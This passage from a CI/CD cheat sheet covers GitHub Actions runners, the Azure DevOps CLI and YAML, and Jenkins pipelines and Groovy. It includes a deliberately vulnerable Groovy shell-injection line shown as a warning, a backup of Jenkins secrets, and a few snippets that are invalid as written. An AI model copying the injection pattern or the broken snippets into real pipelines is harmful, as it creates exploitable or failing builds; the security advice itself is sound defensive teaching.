- uses: dorny/paths-filter@4512585405083f25c027a35db413c2b3b9006d50   # v3.0.1
# ⭐ and let Dependabot keep them current:
#    .github/dependabot.yml → package-ecosystem: github-actions, interval: weekly
# ⭐ and CODEOWNERS on .github/ so a pin change requires a security review:
#    /.github/**  @3558Bhk/security @3558Bhk/platform-team
# ⭐ the one-liner to convert every tag to a SHA:
grep -rhoE 'uses: [^@]+@v[0-9.]+' .github/workflows/ | sort -u | while read -r l; do
  a="${l#uses: }"; owner="${a%@*}"; tag="${a##*@}"
  sha=$(gh api "repos/$owner/commits/$tag" --jq .sha 2>/dev/null)
  echo "  - uses: $owner@$sha   # $tag"
done
```

### 4.4 Self-hosted runners

```bash
# ⭐ the registration
mkdir actions-runner && cd actions-runner
curl -sL https://github.com/actions/runner/releases/download/v2.325.0/actions-runner-linux-x64-2.325.0.tar.gz | tar xz
./config.sh --url https://github.com/3558Bhk \
  --token "$REG_TOKEN" \
  --name gpu-runner-01 \
  --runnergroup default \
  --labels self-hosted,linux,x64,gpu,cicd \
  --work _work \
  --unattended --replace
./run.sh                                    # foreground
sudo ./svc.sh install && sudo ./svc.sh start   # ⭐ as a systemd service

# ⭐⭐ THE #1 SELF-HOSTED RUNNER RULE:
#   NEVER put a self-hosted runner on a PUBLIC repository.
#   A fork PR runs your `on: pull_request` workflow ON YOUR HARDWARE with
#   attacker-controlled code. That's remote code execution with your secrets.
#   If you must: `pull_request_target` (runs the BASE branch's code) — but then
#   ⭐⭐ NEVER check out and run the PR's code in it. See §11.

# ── the ephemeral, containerised runner (the right way) ────────
# ⭐ one pod per job, destroyed after. No state, no persistence, no lateral movement.
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment            # the actions-runner-controller CRD
metadata: {name: shop-runner, namespace: actions-runner}
spec:
  template:
    spec:
      organization: 3558Bhk
      labels: [self-hosted, cicd, k8s]
      ephemeral: true             # ⭐⭐ one job then gone
      dockerEnabled: false        # ⭐ no docker-in-docker
      dockerdWithinRunnerContainer: false
      image: summerwind/actions-runner-dind:latest
      resources: {requests: {cpu: '1', memory: 2Gi}, limits: {memory: 4Gi}}
      securityContext: {runAsNonRoot: true}
---
apiVersion: actions.summerwind.dev/v1alpha1
kind: HorizontalRunnerAutoscaler
metadata: {name: shop-runner-hra, namespace: actions-runner}
spec:
  scaleTargetRef: {name: shop-runner}
  minReplicas: 1
  maxReplicas: 20
  metrics:
    - type: TotalNumberOfQueuedAndInProgressWorkflowRuns
      repositoryNames: [shop, shop-config]
---
# and the runner scale SET (the newer GitHub-supported way):
apiVersion: actions.github.com/v1alpha1
kind: ActionsListener
# … see github/actions/actions-runner-controller for the current CRDs
```

---

<a name="5--azure-devops-"></a>
## 5 · 🔷 Azure DevOps

### 5.1 The `az devops` / `az pipelines` CLI

```bash
az extension add --name azure-devops
az devops login --organization https://dev.azure.com/yourorg     # ⭐ a PAT
export AZURE_DEVOPS_EXT_PAT="$PAT"                               # ⭐ or an env var
az devops configure --defaults organization=https://dev.azure.com/yourorg project=shop
az devops project list -o table

# ── pipelines ───────────────────────────────────────────────────
az pipelines list -o table
az pipelines show --id 42
az pipelines create --name shop-api-ci --repository shop --branch main \
  --yaml-path azure-pipelines.yml --service-connection ghcr
az pipelines run --id 42 --branch release/1.2 --open
az pipelines run --name shop-api-ci --branch main \
  --variables "DEPLOY=true" "SERVICE=checkout"
az pipelines list-runs --id 42 --top 20 -o table
az pipelines show-run --pipeline-id 42 --run-id 999
az pipelines runs artifact list --run-id 999 --pipeline-id 42
az pipelines runs artifact download --run-id 999 --pipeline-id 42 --artifact-name digest --path ./
az pipelines runs export --run-id 999 --type SLSA       # ⭐ provenance from ADO itself
az pipelines pause --id 42 && az pipelines resume --id 42
az pipelines delete --id 42

# ── variable groups and secrets ─────────────────────────────────
az pipelines variable-group list -o table
az pipelines variable-group create --name shop-common \
  --variables REGISTRY=ghcr.io/3558bhk NAMESPACE=shop --authorize true
az pipelines variable-group variable create --group-name shop-common \
  --name API_KEY --secret true --value "…"
az pipelines variable-group variable update --id 12 --name API_KEY --value "…" --secret true
az pipelines variable-group variable delete --id 12 --name API_KEY -y
# ⭐⭐ link a variable group to a KEY VAULT (so nothing is stored in ADO):
az pipelines variable-group create --name shop-keyvault \
  --vault-name shop-kv --authorize true
#    → every Key Vault secret becomes a pipeline variable automatically.

# ── service connections ─────────────────────────────────────────
az devops service-endpoint list -o table
az devops service-endpoint github create --name ghcr \
  --github-url https://github.com --github-personal-access-token "$PAT"
az devops service-endpoint azurerm create --name shop-azure \
  --azure-subscription "…" --subscription-id "…" --tenant-id "…" \
  --service-principal-id "…" --service-principal-key "…"
# ⭐⭐ the WORKLOAD IDENTITY FEDERATION connection (no secret at all):
az devops service-endpoint azurerm create --name shop-wif \
  --azure-subscription "My Sub" --subscription-id "…" --tenant-id "…" \
  --service-principal-id "…" --service-connection-type "WorkloadIdentityFederation"
az devops service-endpoint update --id "$ID" --enable-for-all true
#    → the pipeline exchanges its OIDC token for an Azure AD token.
#      NO client secret is ever stored. ⭐ That's the goal.

# ── repos, PRs, policies ────────────────────────────────────────
az repos list -o table
az repos pr list --repository shop --state active -o table
az repos pr show --id 42 --open
az repos pr create --source-branch feature/x --target-branch main --title "…" \
  --description "…" --reviewers team-x --work-items 123 --squash true
az repos pr vote --id 42 --vote approve
az repos pr update --id 42 --auto-complete true --merge-commit-message "…"
az repos pr policy list --id 42                 # ⭐ the branch-policy status
az repos pr work-item list --id 42
# branch policies (the ADO equivalent of GitHub's rulesets):
az repos policy build create --branch main --repository-id "$RID" \
  --enabled true --blocking true \
  --definition-id 42 --queue-on-source-update-only true \
  --valid-duration 720 --display-name "CI must pass"
az repos policy required-reviewer create --branch main --repository-id "$RID" \
  --required-reviewer-ids "$USER_ID" --blocking true --message "SRE approval"
az repos policy approver-count create --branch main --repository-id "$RID" \
  --minimum-approver-count 2 --creator-vote-counts false --blocking true
az repos policy work-item-linking create --branch main --repository-id "$RID" \
  --enabled true --blocking true               # ⭐ every PR needs a work item
az repos policy comment-required create --branch main --repository-id "$RID" --enabled true
```

### 5.2 The YAML you'll type wrong

```yaml
# ── VARIABLES: three syntaxes, and one is a trap ────────────────
variables:
  PLAIN: value                    # $(PLAIN)
  SECRET: ''                      # set in the UI as a secret; $(SECRET)
  - name: FROM_TEMPLATE
    value: $[ dependencies.A.outputs['j.stepName.out'] ]   # ⭐⭐ a runtime expression
  - group: shop-common            # ⭐ a variable group
  - name: KEYVAULT_VAR
    value: ${{ variables.X }}     # ⭐ a TEMPLATE expression (compile time)

# ⭐⭐ THE THREE EXPRESSION SYNTAXES — this is where everyone gets stuck:
#   $(name)          a MACRO. Expanded BEFORE the step runs, by the agent.
#                    Works in most fields. ⛔ NOT in `condition:`.
#   $[ expressions ] a TEMPLATE/RUNTIME expression. Evaluated at COMPILE time
#                    (${{ }}) or at job-scheduling time ($[ ]). Required for
#                    cross-job outputs and `dependsOn` conditions.
#   ${{ }}           a TEMPLATE expression. Evaluated when the YAML is
#                    EXPANDED, before the job runs. Sees only compile-time values.
# ⛔ THE TRAP: `condition: $(X) == 'yes'` never works. Use:
#    condition: eq(variables['X'], 'yes')

# ── CONDITIONS ──────────────────────────────────────────────────
condition: succeeded()                                  # the default
condition: always()
condition: failed()
condition: canceled()
condition: succeededOrFailed()
condition: and(succeeded(), eq(variables['Build.SourceBranchName'], 'main'))
condition: or(eq(variables['MODE'], 'a'), eq(variables['MODE'], 'b'))
condition: not(eq(variables['SKIP'], 'true'))
condition: contains(variables['Build.SourceVersionMessage'], '[deploy]')
condition: startsWith(variables['Build.SourceBranch'], 'refs/tags/v')
condition: in(variables['Build.Reason'], 'Manual', 'Schedule')
condition: gt(variables['COUNT'], 5)
condition: eq(stageDependencies.Build.outputs['build.digest'], 'x')   # ⭐ cross-stage
condition: eq(dependencies.A.outputs['j.s.out'], 'x')                 # ⭐ same-stage
condition: in(dependencies.A.result, 'Succeeded', 'SucceededWithIssues')
# ⭐ the FUNCTIONS: succeeded, failed, canceled, always, succeededOrFailed,
#    and, or, xor, not, eq, ne, gt, ge, lt, le, in, notIn, contains, startsWith,
#    endsWith, coalesce, variables['x'], stageDependencies, dependencies

# ── TEMPLATES ⭐ the reuse mechanism ────────────────────────────
# ── a STEP template: templates/steps.yml
parameters:
  - name: service
    type: string
  - name: languages
    type: object
    default: []
  - name: failFast
    type: boolean
    default: false
  - name: publishResults
    type: boolean
    default: true
steps:
  - checkout: self
    fetchDepth: 0
  - ${{ each lang in parameters.languages }}:
      - bash: ./ci/test-${{ lang }}.sh ${{ parameters.service }}
        displayName: Test (${{ lang }})
  - ${{ if parameters.publishResults }}:
      - task: PublishTestResults@2
        inputs: {testResultsFormat: JUnit, testResultsFiles: '**/TEST-*.xml', failTaskOnFailedTests: true}
# ── consuming it:
extends:
  template: templates/pipeline-template.yml@shop-templates    # ⭐⭐ from another repo
  parameters:
    service: shop-api
    environments: [dev, staging, production]

# ⭐⭐ `extends:` — the UN-BYPASSABLE template.
#    With `extends`, the child pipeline CANNOT add arbitrary steps. It can only
#    fill in the parameters the template exposes. Combine with a branch policy
#    requiring that template, and no developer can deploy without the gates.
#    That is the Azure DevOps equivalent of GitHub's required status checks
#    plus a shared reusable workflow.
# templates/pipeline-template.yml:
parameters:
  - name: service
    type: string
  - name: environments
    type: object
stages:
  - stage: Build
    jobs:
      - job: Build
        steps:
          - bash: ./ci/test.sh ${{ parameters.service }}
          - bash: ./ci/build.sh ${{ parameters.service }}
  - ${{ each env in parameters.environments }}:
      - stage: Deploy_${{ env }}
        dependsOn: Build
        jobs:
          - deployment: Deploy
            environment: ${{ env }}           # ⭐ gates come from the environment
            strategy:
              runOnce:
                deploy:
                  steps:
                    - bash: ./scripts/deploy.sh ${{ env }} ${{ parameters.service }} "$(DIGEST)"

# ── DEPLOYMENT JOBS ⭐ where the approval gates live ────────────
jobs:
  - deployment: DeployProd
    displayName: 🚀 Deploy to production
    environment:
      name: production                     # ⭐⭐ the gates are configured on THIS
      resourceName: shop-api               # for VM targets
    pool: {vmImage: ubuntu-latest}
    strategy:
      runOnce:                             # ⭐ or rolling / canary for VMs
        preDeploy:                         # ⭐ runs BEFORE the gates clear? NO —
          steps:                           #    preDeploy runs AFTER approval,
            - bash: ./scripts/backup.sh    #    before the main deploy
        deploy:
          steps:
            - bash: ./scripts/deploy.sh production shop-api "$(DIGEST)"
        routeTraffic:
          steps:
            - bash: ./scripts/smoke-test.sh
        postRouteTraffic:
          steps:
            - bash: ./scripts/verify.sh
        on:
          failure:
            steps:
              - bash: ./scripts/rollback.sh
          success:
            steps:
              - bash: ./scripts/notify.sh
    timeoutInMinutes: 60
# ⭐ the ENVIRONMENT CHECKS (configured in the UI: Pipelines → Environments → production):
#    · Approvals               ← ⭐⭐ required reviewers, with an expiry
#    · Branch control          ← only main/release may deploy
#    · Task group restrictions
#    · Environment resources   ← which repos/VMs/queues are allowed
#    · Exclusive lock          ← ⭐⭐ only one deployment at a time
#    · Evaluate Pipeline artifact checks
#    · Query Azure Monitor alerts   ← ⭐⭐ an automated SLO gate!
#    · Query Work Items
#    · Invoke Azure Function
#    · REST API check          ← call your own gate service

# ── AGENT POOLS ─────────────────────────────────────────────────
# Microsoft-hosted: pool: {vmImage: ubuntu-latest}   ← Ubuntu 24.04
#                   pool: {vmImage: windows-latest}  ← Server 2022
#                   pool: {vmImage: macOS-latest}    ← macOS 14/15
#                   ⭐ demands: ['Agent.OS -equals Linux']
# Self-hosted:
#   ./config.sh --url https://dev.azure.com/yourorg --auth pat --token "$PAT" \
#     --pool shop-pool --agent-name build-01 --work _work --unattended \
#     --replace --acceptTeeEula
#   sudo ./svc.sh install && sudo ./svc.sh start
#   ⭐⭐ set `--unattended` AND configure the agent to run as a NON-root user.
#   ⭐⭐ and a self-hosted agent on a PUBLIC repo has the same fork-PR problem
#      as GitHub's. Use `pool: {name: self-hosted}` only on private repos,
#      and add the "Branch control" environment check.
# ⭐ the DEMANDS syntax for routing:
pool:
  name: shop-pool
  demands:
    - agent.name -equals build-01
    - docker -exists
    - java.version -equals 21
```

### 5.3 Classic → YAML migration (the six-step path)

```
1. EXPORT     Pipeline → ⋯ → "Export to YAML". You get a machine-generated
              file with `task: X@N` for every classic task.
2. AUDIT      `grep -n 'task:' exported.yml | sort -u`
              → list every task and its version. Old major versions are the
                usual breakage.
3. SEPARATE   Move the real logic into scripts under ci/ and scripts/.
              ⭐ The classic pipeline almost certainly has inline PowerShell or
                bash with 200 lines. Extract it FIRST — that's the actual work.
4. SHADOW     Run the YAML pipeline in PARALLEL with the classic one, deploying
              to a THROWAWAY namespace. Compare the outputs.
              ⭐ Do NOT cut over on day one.
5. ROTATE     ⭐⭐ DO NOT MIGRATE SECRETS — ROTATE THEM.
              A classic pipeline's secrets sit in the release definition.
              Create NEW secrets in Key Vault, wire the YAML pipeline to them
              via a WIF-backed variable group, and REVOKE the old ones.
              Migrating a secret means it existed in two places for a while.
6. CUT OVER   Disable the classic trigger, enable the YAML one, watch for a
              week, then delete the classic pipeline. Keep the export in Git.
```

---

<a name="6--jenkins-"></a>
## 6 · 🔨 Jenkins

### 6.1 The CLI and the REST API

```bash
export JENKINS_URL=http://localhost:8080
export JENKINS_USER=admin
export JENKINS_TOKEN=$(cat ~/.jenkins-token)      # ⭐ an API token, NOT a password
AUTH="-u $JENKINS_USER:$JENKINS_TOKEN"
CRUMB=$(curl -sf $AUTH "$JENKINS_URL/crumbIssuer/api/json" | jq -r '"\(.crumbRequestField):\(.crumb)"')

# ── the jenkins-cli.jar (the real CLI) ─────────────────────────
curl -sO "$JENKINS_URL/jnlpJars/jenkins-cli.jar"
alias jcli="java -jar jenkins-cli.jar -s $JENKINS_URL -auth $JENKINS_USER:$JENKINS_TOKEN"
jcli help
jcli list-jobs
jcli list-jobs shop/
jcli who-am-i
jcli build shop/main -s -v -p DEPLOY=true            # ⭐ -s waits, -v tails the log
jcli build shop/main -f                               # follow the console
jcli stop 999                                         # abort a build
jcli console 999
jcli set-build-display-name shop/main 999 "v1.4.2"
jcli get-job shop/main > job.xml && jcli update-job shop/main < job.xml
jcli create-job new-job < job.xml && jcli delete-job old-job
jcli rename-job old-name new-name                     # ⭐ preserves history
jcli copy-job source dest
jcli reload-job shop/main                             # re-read config.xml from disk
jcli list-plugins | grep -iE 'git|pipeline|kube'
jcli install-plugin kubernetes -deploy
jcli safe-restart                                     # ⭐ finishes running builds first
jcli quiet-down -message "maintenance at 18:00"       # ⭐ stop accepting new builds
jcli cancel-quiet-down
jcli version
jcli groovy = < script.groovy                         # ⭐⭐ the Script Console — god mode
jcli connect-node agent-1
jcli disconnect-node agent-1
jcli list-credentials
jcli create-credentials-by-xml system::system::jenkins _ < cred.xml

# ── the REST API (what the CLI uses) ───────────────────────────
curl -sf $AUTH "$JENKINS_URL/api/json?tree=jobs[name,color,url]" | jq
curl -sf $AUTH "$JENKINS_URL/job/shop/job/main/api/json" | jq '.lastBuild.number, .builds[:5] | .[].result'
curl -sf $AUTH "$JENKINS_URL/job/shop/job/main/lastBuild/api/json" | jq
curl -sf $AUTH "$JENKINS_URL/job/shop/job/main/lastBuild/consoleText" | tail -50
curl -sf $AUTH "$JENKINS_URL/job/shop/job/main/lastBuild/wfapi/describe" | jq '.stages[] | {name, status, durationMillis}'
curl -sf $AUTH "$JENKINS_URL/queue/api/json" | jq '.items[] | {task: .task.name, why, inQueueSince}'
curl -sf $AUTH "$JENKINS_URL/computer/api/json?depth=1" | jq '.computer[] | {displayName, offline, numExecutors}'
curl -sf $AUTH "$JENKINS_URL/pluginManager/api/json?depth=1" | jq '.plugins[] | {shortName, version, active, hasUpdate}'
curl -sf $AUTH "$JENKINS_URL/credentials/store/system/domain/_/api/json" | jq '.credentials[].id'
# trigger a build:
curl -sf -XPOST $AUTH -H "$CRUMB" "$JENKINS_URL/job/shop/job/main/build"
# with parameters:
curl -sf -XPOST $AUTH -H "$CRUMB" "$JENKINS_URL/job/shop/job/main/buildWithParameters" \
  -d DEPLOY=true -d SERVICE=checkout
# ⭐⭐ a build of a job in a FOLDER is /job/A/job/B — slashes become /job/ segments
# ⭐ the webhook secret:
curl -sf -XPOST $AUTH -H "$CRUMB" -H "X-Jenkins-Trigger-Token: $HOOK" \
  "$JENKINS_URL/generic-webhook-trigger/invoke?token=$HOOK" -d '{"ref":"main"}'

# ── health, backup, upgrade ─────────────────────────────────────
curl -sf "$JENKINS_URL/login" -o /dev/null -w '%{http_code}\n'
curl -sf $AUTH "$JENKINS_URL/manage/systemInfo" | head -40
curl -sf $AUTH "$JENKINS_URL/manage/administrativeMonitor" | jq
# ⭐ the backup: SECRETS + config.xml. Everything else is reproducible from Git.
kubectl -n jenkins exec sts/jenkins -c jenkins -- \
  tar czf - /var/jenkins_home/secrets /var/jenkins_home/config.xml \
            /var/jenkins_home/credentials.xml /var/jenkins_home/jobs \
            /var/jenkins_home/users > backup-$(date -u +%FT%TZ).tar.gz
# ⭐⭐ restore DRILL — a backup you've never restored is not a backup:
kubectl -n jenkins scale sts/jenkins --replicas=0
kubectl -n jenkins run restore --image=busybox --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"r","image":"busybox","command":["sleep","3600"],
   "volumeMounts":[{"name":"jh","mountPath":"/var/jenkins_home"}]}],
   "volumes":[{"name":"jh","persistentVolumeClaim":{"claimName":"jenkins"}}]}}'
kubectl -n jenkins cp backup.tar.gz restore:/tmp/
kubectl -n jenkins exec restore -- sh -c 'cd /var/jenkins_home && tar xzf /tmp/backup.tar.gz -C /'
kubectl -n jenkins scale sts/jenkins --replicas=1

# ⭐ UPGRADE: never skip an LTS line, and never upgrade on a Friday.
helm repo update && helm search repo jenkinsci/jenkins --versions | head -8
helm diff upgrade jenkins jenkinsci/jenkins -n jenkins -f values.yaml   # ⭐ READ THIS
kubectl -n jenkins get sts jenkins -o jsonpath='{.spec.template.spec.containers[0].image}'
helm upgrade jenkins jenkinsci/jenkins -n jenkins -f values.yaml
kubectl -n jenkins rollout status sts/jenkins
curl -sf "$JENKINS_URL/login" -o /dev/null -w '%{http_code}\n'
# ⭐ Java: Jenkins LTS 2.568.x requires JAVA 21 MINIMUM. Java 17 support ended
#    at the 2.555 line. Check `java -version` on the controller AND the agents.
```

### 6.2 Declarative pipeline — the full skeleton

```groovy
pipeline {
  // ══ AGENT ══════════════════════════════════════════════════
  agent any                                    // ⛔ the controller — never do this
  agent none                                   // ⭐ per-stage agents
  agent { label 'docker && linux' }            // label expression
  agent { node { label 'build'; customWorkspace '/tmp/ws' } }
  agent { docker { image 'maven:3.9-eclipse-temurin-21'
                   args '-v $HOME/.m2:/root/.m2'
                   label 'docker'
                   reuseNode false } }
  agent { dockerfile { filename 'Dockerfile.ci'; dir 'ci'
                       additionalBuildArgs '--build-arg V=1'
                       label 'docker' } }
  agent { kubernetes {                         // ⭐⭐ the production pattern
    yaml '''
apiVersion: v1
kind: Pod
metadata: {labels: {jenkins: shop-agent}}
spec:
  serviceAccountName: jenkins-agent            # ⭐ scoped, NOT the controller's SA
  automountServiceAccountToken: false          # ⭐⭐ no cluster access by default
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    seccompProfile: {type: RuntimeDefault}
  containers:
    - name: tools
      image: ghcr.io/3558bhk/ci-tools:1.4.0@sha256:…   # ⭐ DIGEST-pinned
      command: ['sleep']
      args: ['infinity']
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: false          // ⚠️ the workspace must be writable
        capabilities: {drop: ['ALL']}
      resources:
        requests: {cpu: 500m, memory: 1Gi}
        limits:   {memory: 3Gi}                // ⭐ no CPU limit — throttling
      volumeMounts:
        - {name: ws,    mountPath: /home/jenkins/agent}
        - {name: tmp,   mountPath: /tmp}
        - {name: dshm,  mountPath: /dev/shm}
    - name: kaniko
      image: gcr.io/kaniko-project/executor:v1.23.2-debug
      command: ['sleep']
      args: ['infinity']
      securityContext: {runAsUser: 0, allowPrivilegeEscalation: false}
  volumes:
    - {name: ws,   emptyDir: {}}
    - {name: tmp,  emptyDir: {}}
    - {name: dshm, emptyDir: {medium: Memory, sizeLimit: 1Gi}}
  restartPolicy: Never
  activeDeadlineSeconds: 300
'''
    defaultContainer 'tools'
    inheritFrom 'shop-hardened'                // ⭐ a pod template in the cloud config
  } }

  // ══ OPTIONS ════════════════════════════════════════════════
  options {
    timestamps()                               // ⭐ always
    ansiColor('xterm')                         // ⭐ always
    timeout(time: 45, unit: 'MINUTES')         // ⭐⭐ ALWAYS. A hung build eats an agent.
    disableConcurrentBuilds()                  // ⭐ or use lock() for finer control
    skipDefaultCheckout(true)                  // ⭐ you control the checkout
    preserveStashes(buildCount: 10)
    buildDiscarder(logRotator(numToKeepStr: '100', daysToKeepStr: '180',
                              artifactNumToKeepStr: '20'))
    quietPeriod(10)                            // ⭐ coalesce rapid pushes
    retry(2)                                   // ⚠️ retries the WHOLE pipeline
    parallelsAlwaysFailFast()
    throttle(['deployments'])                  // Throttle Concurrent Builds plugin
  }

  // ══ PARAMETERS ═════════════════════════════════════════════
  parameters {
    string(name: 'SERVICE',     defaultValue: 'shop-api', description: 'which service')
    choice(name: 'ENVIRONMENT', choices: ['dev', 'staging', 'production'], description: 'where')
    booleanParam(name: 'DRY_RUN', defaultValue: false, description: 'do not actually deploy')
    password(name: 'API_TOKEN', description: 'never logged')
    text(name: 'NOTES', defaultValue: '')
    gitParameter(name: 'BRANCH', type: 'PT_BRANCH', defaultValue: 'main')
  }

  // ══ ENVIRONMENT ════════════════════════════════════════════
  environment {
    REGISTRY  = 'ghcr.io/3558bhk'
    IMAGE     = "${REGISTRY}/${params.SERVICE}"
    // ⭐ credentials() binds a credential to env vars, scoped to the block
    // ⭐⭐ computed values:
    REV       = "${sh(script: 'git rev-parse --short HEAD', returnStdout: true).trim()}"
    // ⚠️ this runs at PIPELINE-PARSE time, before any checkout. Usually wrong.
    //    ⭐ compute it in a stage instead.
  }

  // ══ TOOLS ══════════════════════════════════════════════════
  tools { maven 'maven-3.9'; jdk 'temurin-21'; gradle 'gradle-8'; go 'go-1.23' }

  // ══ STAGES ═════════════════════════════════════════════════
  stages {
    stage('Checkout') {
      steps {
        checkout scm                             // ⭐ or an explicit git step
        script { env.REV = sh(returnStdout: true, script: 'git rev-parse HEAD').trim() }
      }
    }

    stage('Build & Test') {
      // ⭐⭐ beforeAgent: evaluate the `when` BEFORE allocating a pod
      when { beforeAgent true; branch 'main' }
      options { timeout(time: 15, unit: 'MINUTES') }
      steps {
        dir('apps/shop-api') {
          sh './mvnw -B -T 1C verify'
        }
      }
      post {
        always {
          junit testResults: '**/target/surefire-reports/*.xml',
                allowEmptyResults: false,        // ⭐⭐ false! true hides missing tests
                skipPublishingChecks: false,
                healthScaleFactor: 2.0
          publishHTML(target: [reportDir: 'target/site/jacoco', reportFiles: 'index.html',
                               reportName: 'Coverage', keepAll: true, alwaysLinkToLastBuild: true])
          recordCoverage(tools: [[parser: 'JACOCO']], sourceDirectories: [[path: 'src/main/java']])
        }
      }
    }

    stage('Parallel work') {
      parallel {
        stage('Lint')   { steps { sh './ci/lint.sh' } }
        stage('Unit')   { steps { sh './ci/unit.sh' } }
        stage('SAST')   { steps { sh './ci/sast.sh' } }
      }
    }

    stage('Image') {
      agent { kubernetes { defaultContainer 'kaniko' } }   // ⭐ switch containers
      steps {
        script {
          def digest = sh(returnStdout: true, script: '''
            set -euo pipefail
            mkdir -p /kaniko/.docker
            printf '{"auths":{"ghcr.io":{"auth":"%s"}}}' "$(printf '%s:%s' "$U" "$P" | base64 -w0)" \
              > /kaniko/.docker/config.json
            /kaniko/executor \
              --context "dir://${WORKSPACE}/apps/shop-api" \
              --dockerfile "${WORKSPACE}/apps/shop-api/Dockerfile" \
              --destination "${IMAGE}:${REV}" \
              --cache=true --cache-repo="${IMAGE}-cache" --cache-ttl=168h \
              --sbom=cyclonedx --reproducible --skip-tls-verify=false \
              --label org.opencontainers.image.revision="${REV}" \
              --label org.opencontainers.image.source="${GIT_URL}"
            crane digest "${IMAGE}:${REV}"
          ''').trim().tokenize('\n').last()
          env.DIGEST = digest
          echo "  ✅ ${IMAGE}@${digest}"
        }
      }
    }

    stage('Approval') {
      when { beforeAgent true; expression { params.ENVIRONMENT == 'production' } }
      options { timeout(time: 24, unit: 'HOURS') }
      steps {
        script {
          def window = sh(returnStdout: true, script: './scripts/production-gate.sh').trim()
          if (window != 'OK') { error("⛔ the production gate refused: ${window}") }
        }
        timeout(time: 24, unit: 'HOURS') {
          input message: "Deploy ${params.SERVICE}@${env.DIGEST?.take(19)}… to PRODUCTION?",
                ok: 'Deploy',
                submitter: 'sre-team,release-managers',   // ⭐⭐ WHO may approve
                submitterParameter: 'APPROVER',
                canSubmit: { /* an extra programmatic check */ true }
      }
      }
      post {
        aborted {                                          // ⭐⭐ the timeout path
          script {
            // a timeout throws FlowInterruptedException → the build is ABORTED
            echo "⏰ the approval timed out after 24h. NOT deploying."
            currentBuild.result = 'ABORTED'
            currentBuild.description = 'approval timeout — no deployment happened'
          }
          // ⭐⭐ PROVE nothing deployed:
          //   grep the console for the deploy command; it must not appear.
        }
      }
    }

    stage('Deploy') {
      options {
        lock(resource: "deploy-${params.ENVIRONMENT}-${params.SERVICE}",   // ⭐⭐ mutex
             inversePrecedence: true, quantity: 1)
        milestone(label: "deploy-${params.SERVICE}")      // ⭐ abort older queued runs
      }
      steps {
        timeout(time: 20, unit: 'MINUTES') {
          retry(2) {                                      // ⭐ retries THIS step
            sh './scripts/deploy.sh ${ENVIRONMENT} ${SERVICE} "${IMAGE}@${DIGEST}"'
          }
        }
      }
    }
  }

  // ══ POST ═══════════════════════════════════════════════════
  post {
    always {
      script {
        currentBuild.description = "#${BUILD_NUMBER} ${params.SERVICE}→${params.ENVIRONMENT} ${env.DIGEST?.take(19) ?: ''}"
        sh './scripts/emit-pipeline-metrics.sh jenkins "${BUILD_NUMBER}"'
      }
      cleanWs(deleteDirs: true, notFailBuild: true, disableDeferredWipeout: true)
    }
    success  { slackSend(channel: '#shop-releases', color: 'good',
                         message: "✅ ${env.JOB_NAME} #${BUILD_NUMBER} ${env.DIGEST?.take(19)}") }
    failure  { slackSend(channel: '#shop-oncall', color: 'danger',
                         message: "⛔ ${env.JOB_NAME} #${BUILD_NUMBER} FAILED — ${env.BUILD_URL}") }
    unstable { slackSend(channel: '#shop-releases', color: 'warning', message: "⚠️ test failures") }
    aborted  { echo '⏰ aborted (a timeout or a manual stop)' }
    changed  { slackSend(message: "the build result CHANGED to ${currentBuild.currentResult}") }
    fixed    { slackSend(message: "✅ back to green") }
    regression { slackSend(message: "⛔ was green, now ${currentBuild.currentResult}") }
    cleanup  { echo 'runs even if the pipeline throws' }   // ⭐ like `always` but later
  }
}
```

### 6.3 Groovy in ten lines

```groovy
// ⭐⭐ THE ONE RULE THAT CAUSES EVERY BUG:
//   SINGLE quotes = a plain shell string. The SHELL expands $VAR.
//   DOUBLE quotes = GROOVY interpolates ${} BEFORE the shell sees it.
sh 'echo $HOME'                    // ✅ the shell expands $HOME
sh "echo $HOME"                    // ⚠️ Groovy expands it — usually fine, but…
sh "echo ${params.USER_INPUT}"     // ⛔⛔ SCRIPT INJECTION. An attacker's PR title
                                   //    becomes shell code. NEVER do this.
// ⭐ the safe way to pass an untrusted value to a shell:
withEnv(["USER_INPUT=${params.USER_INPUT}"]) {
  sh 'echo "$USER_INPUT"'          // ✅ the value never passes through Groovy
}

// variables
def name = 'world'                 // dynamically typed
String typed = 'world'             // statically typed
def list = [1, 2, 3]
def map = [a: 1, b: 2]
map.each { k, v -> println "$k=$v" }
list.collect { it * 2 }            // [2,4,6]
list.findAll { it > 1 }
list.any { it == 2 }
list.join(',')

// strings
def s = "hello ${name}"            // GString — interpolates
def t = 'hello ${name}'            // ⭐ a literal — does NOT interpolate
def multi = """
  line 1
  line 2 ${name}
"""

// control flow
if (env.BRANCH_NAME == 'main') { … } else { … }
switch (params.MODE) { case 'a': …; break; default: … }
for (svc in ['api', 'ui', 'worker']) { … }
(0..4).each { println it }
while (retries-- > 0) { … }
try { sh '…' } catch (Exception e) { echo "failed: ${e.message}" } finally { … }

// ⭐ pipeline-specific
def out = sh(returnStdout: true, script: 'git rev-parse HEAD').trim()
sh(returnStatus: true, script: 'test -f x')            // 0 = exists
def fileExists('config.yaml')
def exists = fileExists('config.yaml')
readFile('config.yaml'); writeFile(file: 'x.txt', text: 'y')
readYaml(file: 'v.yaml'); readJSON(file: 'p.json'); writeYaml(file: 'o.yaml', data: m)
error('⛔ stopping here')                                 // fails the build
unstable('some tests failed')                            // marks UNSTABLE, continues
catchError(buildResult: 'SUCCESS', stageResult: 'UNSTABLE') { sh 'flaky.sh' }
retry(3) { sh '…' }
timeout(time: 5, unit: 'MINUTES') { sh '…' }
sleep(time: 30, unit: 'SECONDS')
waitUntil(initialRecurrencePeriod: 5000) { sh(returnStatus: true, script: 'curl -sf …') == 0 }
parallel(a: { … }, b: { … })
stage('X') { … }                                          // nested/scripted stages
node('label') { … }                                       // allocate an agent
ws('/custom/path') { … }
dir('subdir') { … }
env.X = 'y'; echo env.X
currentBuild.result = 'UNSTABLE'
currentBuild.description = '…'
currentBuild.displayName = '…'
milestone(label: 'deploy')
lock(resource: 'deploy-prod') { … }
input message: 'OK?', submitter: 'sre-team', submitterParameter: 'APPROVER'

// ⭐ CREDENTIALS — every type
withCredentials([
  usernamePassword(credentialsId: 'ghcr', usernameVariable: 'U', passwordVariable: 'P'),
  string(credentialsId: 'api-key', variable: 'KEY'),
  file(credentialsId: 'kubeconfig', variable: 'KUBECONFIG'),
  certificate(credentialsId: 'cert', keystoreVariable: 'KS', aliasVariable: 'AL', passwordVariable: 'PW'),
